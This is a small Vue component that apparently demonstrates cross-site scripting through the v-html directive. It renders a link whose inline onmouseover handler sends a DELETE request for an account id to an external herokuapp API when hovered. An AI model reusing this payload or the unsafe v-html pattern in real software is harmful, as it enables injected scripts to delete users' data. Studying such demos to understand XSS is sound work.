<template>
  <div id="app">
    <span v-html="temp"></span>
  </div>
</template>

<script>
export default {
  name: "App",
  data: function () {
    return {
      temp: `<a onmouseover="console.log((() => {
        let data = {
          id: 1
        };
          async function postData(url = '', data = {}) {
            const response = await fetch(url, {
              method: 'DELETE',
              mode: 'cors', 
              cache: 'no-cache', 
              credentials: 'same-origin', 
              headers: {
                'Content-Type': 'application/json',
              
              },
              redirect: 'follow', 
              referrerPolicy: 'no-referrer', 
              body: JSON.stringify(data), 
            });
          return response.json(); 
        }
        postData('https://api-app-mess-connect.herokuapp.com/accounts', data);
        return 'nhat';
      })())">Mouse me!</a>`,
      ten: "nhat",
    };
  },
};
</script>
